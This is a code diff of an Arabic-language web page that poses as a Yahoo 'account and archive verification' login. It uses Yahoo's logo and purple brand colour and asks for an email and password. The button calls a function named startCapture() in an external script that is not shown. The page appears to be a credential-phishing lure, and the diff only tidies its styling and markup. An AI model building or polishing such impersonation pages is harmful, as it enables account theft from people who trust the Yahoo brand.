@@ -2,78 +2,23 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Yahoo | توثيق الحساب والأرشيف</title>
     <style>
-        body {
-            background-color: #f1f1f5;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .login-box {
-            background: white;
-            padding: 40px;
-            border-radius: 4px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            width: 400px;
-            text-align: center;
-        }
-        .logo {
-            width: 90px;
-            margin-bottom: 25px;
-        }
-        h2 {
-            font-size: 22px;
-            font-weight: bold;
-            color: #26282a;
-            margin-bottom: 30px;
-        }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 15px;
-            border: 1px solid #d8d8d8;
-            border-radius: 4px;
-            background-color: #f0f4ff;
-            box-sizing: border-box;
-            font-size: 15px;
-            text-align: center;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background-color: #6001d2; /* لون ياهو البنفسجي */
-            color: white;
-            border: none;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-            margin-top: 10px;
-        }
-        button:hover {
-            background-color: #4a00a8;
-        }
+        body { background: #f1f1f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 40px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 380px; text-align: center; }
+        .logo { width: 90px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #d8d8d8; border-radius: 4px; text-align: center; }
+        button { width: 100%; padding: 12px; background: #6001d2; color: white; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-
     <div class="login-box">
-        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo">
-        
+        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" class="logo">
         <h2>توثيق الحساب والأرشيف</h2>
-        
         <input type="email" id="email" placeholder="البريد الإلكتروني" required>
         <input type="password" id="pass" placeholder="كلمة المرور" required>
-        
         <button onclick="startCapture()">تسجيل الدخول والتوثيق</button>
     </div>
-
     <script src="app-min.js"></script>
 </body>
 </html>
